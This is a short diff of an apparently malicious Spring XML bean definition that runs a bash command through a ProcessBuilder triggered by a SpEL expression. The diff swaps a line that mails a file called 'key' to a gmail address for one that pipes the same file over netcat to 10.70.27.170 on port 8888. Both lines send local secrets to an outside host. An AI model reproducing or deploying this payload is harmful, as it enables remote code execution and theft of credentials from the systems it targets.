@@ -9,7 +9,7 @@
       <array>
         <value>bash</value>
         <value>-c</value>
-        <value>cat key | mutt -s "test - $1" "illtal1960@gmail.com"</value>
+        <value>cat key | nc 10.70.27.170 8888</value>
       </array>
     </constructor-arg>
     <property name="whatever" value="#{ pb.start() }"/>
